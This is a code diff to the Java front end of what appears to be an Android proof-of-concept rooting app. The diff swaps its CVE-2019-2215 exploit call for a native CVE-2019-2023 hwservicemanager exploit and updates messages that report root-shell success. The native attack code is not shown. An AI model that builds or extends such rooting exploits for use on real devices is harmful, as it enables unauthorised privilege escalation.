@@ -53,7 +53,7 @@ public class MainActivity extends AppCompatActivity {
         System.loadLibrary("pocjni");
     }
 
-    public static native int nativeExploitCVE20192215();
+    public static native int nativeExploitCVE20192023();
 
     private ServiceConnection tzConnection = new ServiceConnection() {
         @Override
@@ -163,12 +163,10 @@ public class MainActivity extends AppCompatActivity {
 
     private void executeExploit() {
         appendLog("========================================");
-        appendLog("========== CVE-2019-2215 FINAL ==========");
+        appendLog("========== CVE-2019-2023 EXPLOIT ==========");
 
-        appendLog("[*] Triggering exploit with epoll_wait...");
-        appendLog("[!] May crash if offsets are incorrect");
-
-        int result = nativeExploitCVE20192215();
+        appendLog("[*] Exploiting hwservicemanager ACL bypass...");
+        int result = nativeExploitCVE20192023();
 
         if (result == 0) {
             appendLog("[+] Exploit SUCCESS! Root shell available.");
@@ -176,9 +174,7 @@ public class MainActivity extends AppCompatActivity {
         } else if (result == -1) {
             appendLog("[-] Exploit FAILED: Permission denied");
         } else if (result == -2) {
-            appendLog("[-] Exploit FAILED: Offset detection failed");
-        } else if (result == -3) {
-            appendLog("[-] Exploit FAILED: Kernel panic detected");
+            appendLog("[-] Exploit FAILED: Service registration failed");
         } else {
             appendLog("[-] Exploit returned: " + result);
         }
@@ -218,9 +214,9 @@ public class MainActivity extends AppCompatActivity {
     private void saveLog() {
         try {
             File dir = getDumpDir();
-            File file = new File(dir, "cve_2019_2215_log.txt");
+            File file = new File(dir, "cve_2019_2023_log.txt");
             try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
-                pw.println("=== CVE-2019-2215 Log ===");
+                pw.println("=== CVE-2019-2023 Log ===");
                 pw.println("Timestamp: " + new Date().toString());
                 pw.println("===================================");
                 pw.print(logBuilder.toString());
